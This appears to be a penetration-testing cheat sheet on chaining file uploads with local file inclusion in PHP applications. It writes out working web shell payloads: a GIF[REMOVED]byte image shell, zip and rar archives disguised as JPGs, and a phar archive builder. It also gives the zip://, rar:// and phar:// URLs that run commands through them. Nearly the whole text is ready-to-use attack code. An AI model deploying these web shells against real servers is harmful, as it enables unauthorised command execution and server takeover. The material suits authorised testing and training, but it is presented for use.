For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability.
## Image Upload
Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image.

Upload Malicious file (see [[Magic Bytes Cheatsheet]])
```bash
# simple php webshell with Magic bytes
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
Upload

# identify uploaded file path
feroxbuster, ffuf, gobuster, etc....

# Run
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

## Zip / Rar / Phar Upload

Also covered in [[PHP Wrappers]] but covers files that get auto converted to zip files...

The methods below allows you to upload malicioud zip/rar/phar files

Zip / Rar Upload
```bash
# Create shell and archive (zip example)
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

# zip wrapper summarized
index.php?page=zip://<path_to_files>/shell.jpg%23shell.php&cmd=id 

# rar wrapper summarized
index.php?page=rar://<path_to_files>/shell.jpg%23shell.php&cmd=id
```

Phar Upload
```php
# vim shell.php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
```bash
# Compile
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

# Upload and run with phar:// wrapper
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```